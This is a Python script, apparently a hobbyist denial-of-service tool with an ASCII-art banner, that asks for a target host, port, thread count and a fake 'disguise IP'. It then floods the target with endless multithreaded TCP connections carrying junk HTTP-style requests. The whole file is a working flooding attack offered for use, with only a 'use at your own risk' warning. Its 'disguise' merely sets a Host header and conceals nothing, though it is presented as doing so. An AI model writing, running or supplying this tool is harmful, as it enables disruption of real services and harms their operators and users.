try:
    import socket
    import time
    import os
    import random

    from threading import Thread
except ModuleNotFoundError:
    print("Please install requiered libraries!")


if not __name__ == "__main__":
    exit()
      
class ConsoleColors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    BOLD = '\033[1m'
    
print(ConsoleColors.BOLD + ConsoleColors.HEADER + '''
 
█████████████████████████████████████████████████████████████████████████
█─█─█─▄▄─█─▄▄▄▄█─▄─▄─█▄─▀█▄─▄█─▄▄─█─▄─▄─█▄─▄▄─█─▄▄─█▄─██─▄█▄─▀█▄─▄█▄─▄▄▀█
█─▄─█─██─█▄▄▄▄─███─████─█▄▀─██─██─███─████─▄███─██─██─██─███─█▄▀─███─██─█
▀▄▀▄▀▄▄▄▄▀▄▄▄▄▄▀▀▄▄▄▀▀▄▄▄▀▀▄▄▀▄▄▄▄▀▀▄▄▄▀▀▄▄▄▀▀▀▄▄▄▄▀▀▄▄▄▄▀▀▄▄▄▀▀▄▄▀▄▄▄▄▀▀        
 ''')
print(ConsoleColors.BOLD + ConsoleColors.FAIL + """
                Created by: Rayan25062011
                Needs fast Internet Connection
                !!!  USE THIS AT YOUR OWN RISK  !!!
""")
    
def getport():
    try:
        p = int(input(ConsoleColors.BOLD + ConsoleColors.OKGREEN + "Port: "))
        return p
    except ValueError:
        print(ConsoleColors.BOLD + ConsoleColors.WARNING + "ERROR Port must be a number, Set Port to default " + ConsoleColors.OKGREEN + "80")
        return 80

host = input(ConsoleColors.BOLD + ConsoleColors.OKBLUE + "Host: ")
disguiseIP = input(ConsoleColors.BOLD + ConsoleColors.OKBLUE + "Duisguise IP: ")
message = input(ConsoleColors.BOLD + ConsoleColors.HEADER + "Message: ")

attackedHostsRESULTS = []


port = getport()
speedPerRun = int(input(ConsoleColors.BOLD + ConsoleColors.HEADER + "Hits Per Run: "))
threads = int(input(ConsoleColors.BOLD + ConsoleColors.WARNING + "Thread Count: "))

ip = socket.gethostbyname(host)

bytesToSend = random._urandom(2450)



i = 0;



class Count:
    packetCounter = 0 
def BeginDDOS():
    try:
        while True:
            dosSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            try:
                dosSocket.connect((ip, port))
                for i in range(speedPerRun):
                    try:
                        dosSocket.send(str.encode("GET ") + bytesToSend + str.encode(" HTTP/1.1 \r\n"))
                        dosSocket.sendto(str.encode("GET ") + bytesToSend + str.encode(" HTTP/1.1 \r\n"), (ip, port))
                        dosSocket.sendto(str.encode("Host: "+disguiseIP), (ip, port))
                        dosSocket.sendto(str.encode(f"<--- {disguiseIP} --->>> Incoming message: {message}"), (ip, port))
                        print(ConsoleColors.BOLD + ConsoleColors.OKGREEN + "-----< PACKET " + ConsoleColors.FAIL + str(Count.packetCounter) + ConsoleColors.OKGREEN + " SUCCESSFUL SENT AT: " + ConsoleColors.FAIL + time.strftime("%d-%m-%Y %H:%M:%S", time.gmtime()) + ConsoleColors.OKGREEN + " >-----")
                        Count.packetCounter = Count.packetCounter + 1
                    except socket.error:
                        print(ConsoleColors.BOLD + ConsoleColors.OKGREEN + "-----< PACKET " + ConsoleColors.FAIL + str(Count.packetCounter) + ConsoleColors.FAIL + " NOT RECEIVED AT: " + ConsoleColors.FAIL + time.strftime("%d-%m-%Y %H:%M:%S", time.gmtime()) + ConsoleColors.OKGREEN + " >-----")


                    except KeyboardInterrupt:
                        print(ConsoleColors.BOLD + ConsoleColors.FAIL + "\r\n[-] Canceled by user")
            except socket.error:
                print(ConsoleColors.BOLD + ConsoleColors.OKGREEN + "-----< PACKET " + ConsoleColors.FAIL + str(Count.packetCounter) + ConsoleColors.FAIL + " NOT RECEIVED AT: " + ConsoleColors.FAIL + time.strftime("%d-%m-%Y %H:%M:%S", time.gmtime()) + ConsoleColors.OKGREEN + " >-----")

            except KeyboardInterrupt:
                print(ConsoleColors.BOLD + ConsoleColors.FAIL + "\r\n[-] Canceled by user")
            dosSocket.close()
    except KeyboardInterrupt:
        print(ConsoleColors.BOLD + ConsoleColors.FAIL + "\r\n[-] Canceled by user")
try:
        
    print(ConsoleColors.BOLD + ConsoleColors.OKBLUE + '''
     _   _   _             _      ____  _             _   _             
    / \ | |_| |_ __ _  ___| | __ / ___|| |_ __ _ _ __| |_(_)_ __   __ _ 
   / _ \| __| __/ _` |/ __| |/ / \___ \| __/ _` | '__| __| | '_ \ / _` |
  / ___ \ |_| || (_| | (__|   <   ___) | || (_| | |  | |_| | | | | (_| |
 /_/   \_\__|\__\__,_|\___|_|\_\ |____/ \__\__,_|_|   \__|_|_| |_|\__, | o o o 
                                                                  |___/ 
          ''')
    print(ConsoleColors.BOLD + ConsoleColors.OKGREEN + "LOADING >> [                    ] 0% ")
    time.sleep(1)
    print(ConsoleColors.BOLD + ConsoleColors.OKGREEN + "LOADING >> [=====               ] 25%")
    time.sleep(1)
    print(ConsoleColors.BOLD + ConsoleColors.WARNING + "LOADING >> [==========          ] 50%")
    time.sleep(1)
    print(ConsoleColors.BOLD + ConsoleColors.WARNING + "LOADING >> [===============     ] 75%")
    time.sleep(1)
    print(ConsoleColors.BOLD + ConsoleColors.FAIL + "LOADING >> [====================] 100%")
    time.sleep(0.6)
    print(ConsoleColors.WARNING + "3")
    time.sleep(0.5)
    print(ConsoleColors.WARNING + "2")
    time.sleep(0.5)
    print(ConsoleColors.WARNING + "1")
    time.sleep(0.7)
    
    
    for i in range(threads):
        try:
            t = Thread(target=BeginDDOS)
            t.start()
        except KeyboardInterrupt:
            print(ConsoleColors.BOLD + ConsoleColors.FAIL + "\r\n[-] Canceled by user")
    
    
    
except KeyboardInterrupt:
    print(ConsoleColors.BOLD + ConsoleColors.FAIL + "\r\n[-] Canceled by user")
